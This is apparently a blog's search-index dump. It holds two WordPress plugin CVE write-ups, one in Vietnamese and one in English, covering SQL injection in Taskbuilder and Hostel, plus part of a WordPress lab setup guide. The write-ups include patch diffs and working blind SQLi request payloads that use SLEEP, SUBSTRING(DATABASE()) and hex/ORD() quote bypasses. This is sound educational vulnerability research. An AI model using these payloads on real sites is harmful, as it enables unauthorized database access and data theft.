'...'. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ OR, AND,...) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/admin/projects/get_users.php\nTrong phi√™n b·∫£n v4.0.1, bi·∫øn $proj_id sau khi escape ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u truy v·∫•n m√† kh√¥ng c√≥ d·∫•u nh√°y ƒë∆°n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n·ªû b·∫£n v4.0.2, truy v·∫•n ƒë√£ ƒë∆∞·ª£c ƒëi·ªÅu ch·ªânh b·∫±ng c√°ch ƒë·∫∑t $proj_id trong d·∫•u nh√°y ƒë∆°n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.2\u0026rdquo; }\nB·∫£n v√° n√†y ƒë·∫£m b·∫£o r·∫±ng gi√° tr·ªã $proj_id sau khi escape ƒë∆∞·ª£c coi l√† m·ªôt chu·ªói literal, kh√¥ng th·ªÉ tho√°t ra kh·ªèi d·∫•u nh√°y ƒë∆°n ƒë·ªÉ ch√®n th√™m c√∫ ph√°p SQL, qua ƒë√≥ ngƒÉn ch·∫∑n t·∫•n c√¥ng SQL Injection.\nHow it work? File architecture:\nC·∫•u tr√∫c chung c·ªßa file hi·ªán t·∫°i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o n·ªôi dung ch√≠nh (body) c·ªßa modal ob_start(); // ... render HTML danh s√°ch users $body = ob_get_clean(); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o ph·∫ßn footer c·ªßa modal ob_start(); // ... render HTML c√°c n√∫t thao t√°c (Close, Save) $footer = ob_get_clean(); // Tr·∫£ d·ªØ li·ªáu JSON ƒë·ªÉ frontend hi·ªÉn th·ªã modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n$proj_id / $project: L·∫•y d·ªØ li·ªáu project t·ª´ database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay v√¨ xu·∫•t tr·ª±c ti·∫øp, gi√∫p gom n·ªôi dung v√†o bi·∫øn. $body / $footer: Ch·ª©a n·ªôi dung HTML ƒë·ªông c·ªßa modal. json_encode(): Tr·∫£ JSON cho client, c√≥ kh·∫£ nƒÉng ƒë∆∞·ª£c s·ª≠ d·ª•ng trong Ajax ƒë·ªÉ hi·ªÉn th·ªã modal m√† kh√¥ng c·∫ßn refresh trang. File n·∫±m trong th∆∞ m·ª•c includes cho th·∫•y r·∫±ng n√≥ s·∫Ω ƒë∆∞·ª£c g·ªçi ·ªü 1 ch·ª©c nƒÉng n√†o ƒë√≥ ·ªü n∆°i kh√°c. ƒê·ªÉ bi·∫øt ch·ª©c nƒÉng n√†o s·ª≠ d·ª•ng n√≥, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_users.php trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ N√≥ ƒë∆∞·ª£c include trong h√†m wppm_get_users() c·ªßa class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() l√† callback c·ªßa action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } {: file=\u0026ldquo;includes/class-wppm-admin.php v4.0.1\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. wp_ajax_wppm_get_users l√† t√™n hook Ajax, v·ªõi quy t·∫Øc ƒë·∫∑t t√™n: wp_ajax_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ƒë√£ ƒëƒÉng nh·∫≠p. wp_ajax_nopriv_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ch∆∞a ƒëƒÉng nh·∫≠p. ·ªû ƒë√¢y, action = wppm_get_users. Nghƒ©a l√† n·∫øu trong Ajax request b·∫°n g·ª≠i action=wppm_get_users t·ªõi admin-ajax.php, th√¨ WordPress s·∫Ω t√¨m callback t∆∞∆°ng ·ª©ng ƒë·ªÉ x·ª≠ l√Ω, ·ªü ƒë√¢y l√† wppm_get_users(). üëâ Ta ƒë√£ bi·∫øt ƒë∆∞·ª£c action = wppm_get_users, ki·ªÉm tra xem Ajax n√†o s·ª≠ d·ª•ng action n√†y b·∫±ng c√°ch t√¨m t·ª´ kh√≥a wppm_get_users tr√™n c√°c file .js trong th∆∞ m·ª•c ch·ª©a plugin.\nAction wppm_get_users l√† ph·∫ßn data trong request POST c·ªßa h√†m wppm_get_users()\nH√†m wppm_get_users() s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t trong HTML attribute c·ªßa ch·ª©c nƒÉng project\nT·∫°o project m·ªõi Truy c·∫≠p v√†o project ƒë√≥ Inspect code v√† t√¨m h√†m wppm_get_users s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t ·ªü ƒë√¢u, h√†nh ƒë·ªông n√†o s·∫Ω g·ªçi n√≥ üëâ Khi click v√†o icon b√™n c·∫°nh Users ajax s·∫Ω ho·∫°t ƒë·ªông, g·ª≠i request ƒë·∫øn server, l·∫•y danh s√°ch c√°c user tham gia project v√† m√£ HTML hi·ªÉn th·ªã n√≥.\nExploit Detect SQLi B·∫Øt request b·∫±ng BurpSuite, g·ª≠i request v·ªõi SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id ƒë√∫ng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w t∆∞∆°ng ·ª©ng v·ªõi m√£ HEX l√† 0x77 {: .prompt-info }\nS·ª≠ d·ª•ng SUBSTRING(STRING,1,1) ƒë·ªÉ l·∫•y k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa chu·ªói\n·ªû ƒë√¢y, $proj_id b·∫±ng 4 v√¨ SUBSTRING('wordpress',1,1)=0x77 l√† ƒë√∫ng n√™n SELECT l·∫•y gi√° tr·ªã ƒë√∫ng trong IF(condition, value if true, value if false), 4 l√† gi√° tr·ªã c√≥ th·ª±c trong database, n√™n response tr·∫£ v·ªÅ ch·ª©a danh s√°ch ng∆∞·ªùi tham gia d·ª± √°n\nS·ª≠ d·ª•ng HEX technique ƒë·ªÉ bypass h√†m esc_sql() ·ªü tr√™n, d√πng ƒë·ªÉ so s√°nh khi kh√¥ng s·ª≠ d√πng ƒë∆∞·ª£c '\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) V·ªõi proj_id kh√¥ng c√≥ th·ª±c trong database, response s·∫Ω tr·∫£ v·ªÅ k·∫øt qu·∫£ ch·ª©a None\nüëâ Ta ƒë√£ l·∫•y ƒë∆∞·ª£c k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa database name b·∫±ng k·ªπ thu·∫≠t boolean base\nproj_id ƒë√πng: response kh√¥ng ch·ª©a None proj_id sai: response ch·ª©a None C√≥ th·ªÉ s·ª≠ d·ª•ng k·ªπ thu·∫≠t time base nh∆∞ng khi dump s·ªë l∆∞·ª£ng l·ªõn data, th·ªùi gian dump s·∫Ω r·∫•t l√¢u {: .prompt-info }\nConclusion L·ªó h·ªïng CVE-2025-39569 trong plugin WordPress Taskbuilder xu·∫•t ph√°t t·ª´ vi·ªác thi·∫øu d·∫•u nh√°y ƒë∆°n '...' bao quanh d·ªØ li·ªáu ƒë·∫ßu v√†o trong c√¢u l·ªánh SQL, khi·∫øn d·ªØ li·ªáu ng∆∞·ªùi d√πng c√≥ th·ªÉ ƒë∆∞·ª£c di·ªÖn gi·∫£i nh∆∞ m·ªôt ph·∫ßn c·ªßa c√¢u l·ªánh SQL h·ª£p l·ªá.\nB·∫£n v√° ·ªü phi√™n b·∫£n 4.0.2 ƒë√£ kh·∫Øc ph·ª•c v·∫•n ƒë·ªÅ b·∫±ng c√°ch ƒë∆∞a $proj_id v√†o trong '...', ƒë·∫£m b·∫£o n√≥ lu√¥n ƒë∆∞·ª£c x·ª≠ l√Ω nh∆∞ m·ªôt literal string trong SQL.\nKey takeaways:\n∆Øu ti√™n s·ª≠ d·ª•ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay v√¨ t·ª± ch√®n d·ªØ li·ªáu v√†o query. ƒê·ªëi v·ªõi c√°c plugin WordPress, c·∫ßn test k·ªπ l∆∞·ª°ng c√°c Ajax endpoint v√¨ ƒë√¢y l√† n∆°i d·ªÖ xu·∫•t hi·ªán SQLi v√† XSS nh·∫•t. Ng∆∞·ªùi qu·∫£n tr·ªã c·∫ßn th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin/theme ƒë·ªÉ nh·∫≠n b·∫£n v√° k·ªãp th·ªùi. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/posts/2025-09-22-cve-2025-39569/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) v√† v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ \u003cstrong\u003ex·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o\u003c/strong\u003e tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n \u003ccode\u003e'...'\u003c/code\u003e. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"A vulnerability in the Hostel plugin prior to version 1.1.5.7. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed) diff tool: meld or any tool capable of comparing two versions to show differences Analysis The root cause is that the application injects data from a GET request directly into an SQL query while the validation/whitelisting is insufficient.\nPatch Diff Use any diff tool to compare the vulnerable version and the patched version. A clear difference exists in the file controllers/bookings.php\nVulnerable version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Patched version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } üëâ The patch uses a whitelist to restrict which columns can be used for ordering; if the supplied value is not valid it falls back to 'tB.id'.\nAnalysis: The vulnerability appears because the ob parameter is passed directly into the ORDER BY clause after sanitize_text_field(). That function only escapes/cleans text for HTML contexts and does not validate or filter for SQL injection in an SQL context.\nHow it works To inject, we need to identify the complete query used here:\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); The query resides in the default branch of the switch structure.\nAll this logic belongs to the static manage() method of the WPHostelBookings class.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } In WordPress, plugins communicate with core via the Plugin API (Hook System). Therefore, to find where manage() is invoked, we can search for the string \u0026quot;manage\u0026quot; in the plugin folder.\nIn the file models/hostel.php we have:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } Here:\nadd_menu_page() creates the main menu in the Admin Dashboard. add_submenu_page() adds submenu items under that menu. The $callback parameter is the callback function invoked when a user clicks the menu/submenu. Example:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() All these menu/submenu items are registered inside the static menu() method of the WPHostel class. To locate where menu() is called, search for the menu hook in the plugin directory.\nIn the plugin root file hostel.php we have:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() is the WordPress Plugin API that attaches a callback to an action hook. The hook name here is admin_menu, meaning WPHostel::menu() will be called during the lifecycle when WordPress builds the Admin Dashboard Menu. Menu in the Admin UI\nDebugging\nThe faulty functionality is in the Booking Manager, so navigate to the Manage Bookings submenu in the Admin UI.\nRight before the default branch there is a comment // list bookings ‚Äî indicating this code handles listing and ordering bookings.\nOpen your debugger:\nClick Run with Debugger. Set a breakpoint at the switch branch that contains the vulnerable code and at the exact line that assigns the vulnerable value. When you click a column header in the bookings table, observe:\nThe debugger steps into the switch. Use Step Over to reach the default branch. Continue Step Over and inspect variables in Variables \u0026gt; Locals. These variables combine to form the SQL query below. After combining the variables, the full query looks like:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... Notably, the $orderby variable is assigned as:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è Issues here:\nThe part after ORDER BY uses sanitize_text_field(). That function only cleans HTML, and does not validate or filter input to make it safe in an SQL context. Therefore the ob parameter (provided by the user) can be abused to inject SQL directly. Exploit Detecting SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 We separate the ORDER BY clause with a comma because it accepts multi-column values.\nResult: the response time is delayed ‚Üí SQL Injection succeeded.\nDumping Data from the Database Bypass ' using ORD():\nTo dump database data we need to extract characters such as the first character of the database name.\nBecause sanitize_text_field() removes single quotes ('), we cannot use payloads relying on '. Instead, use ORD() to compare character ASCII codes:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds ‚Üí we can extract the database name.\nBypass ' using Hex encoding (alternative)\nBesides ORD() we can use Hex encoding to bypass:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds ‚Üí database name can be extracted.\nConclusion The vulnerability CVE-2025-39566 in the WordPress Hostel plugin (versions prior to 1.1.5.7) stems from inserting user-supplied input directly into an SQL query without adequate safeguards, leading to SQL Injection.\nKey takeaways:\nsanitize_text_field() ‚â† protection against SQL Injection Distinguish clearly between input cleaning for HTML contexts and validation/sanitization for SQL contexts References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eA vulnerability in the \u003cstrong\u003eHostel\u003c/strong\u003e plugin prior to version \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool capable of comparing two versions to show differences\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe root cause is that the application injects data from a \u003cstrong\u003eGET\u003c/strong\u003e request directly into an SQL query while the validation/whitelisting is insufficient.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It‚Äôs an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\nReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc. Today, more than 40% of websites worldwide run on WordPress. There are two versions of WordPress:\nWordPress.com\nHosting service provided by Automattic You only need to register an account, no installation required Limited customization, advanced features require payment WordPress.org\nOpen-source, you download and install it on your own hosting/server Full customization, install plugins, themes, write code, build any website you want Ecosystem Core: The main CMS Plugins: Add-on software installed on a WordPress site to extend functionality and add new features Themes: Add-on software that defines the visual appearance and layout of a WordPress site Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Currently, over 40% of all websites worldwide run WordPress This means hackers only need to find one common vulnerability =\u0026gt; they can exploit millions of sites at once Like the saying: ‚Äúfish where the fish are‚Äù Plugin and Theme WordPress Core has been reviewed for a long time by thousands of developers and researchers, making it difficult for attackers to break in However, tens of thousands of plugins and themes from various sources are in use, with inconsistent quality Many plugins have poor security code or are no longer updated. Hackers only need to scan plugins/themes for outdated versions and exploit them Setup WordPress for Hacking There are many ways to set up WordPress; searching on Google will show plenty of guides. Here, I‚Äôll set it up on an Ubuntu (22.04) virtual machine:\nNo effect on the host machine‚Äôs services WordPress is lightweight enough to run in a VM Install and Configure WordPress Install Dependencies Install the full stack needed to run WordPress (web server + database + PHP + required extensions).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Download and install WordPress source code into the web directory.\n# Create a folder to store the website source code sudo mkdir -p /srv/www # Change owner to www-data, the default user for Apache/Nginx web server sudo chown www-data: 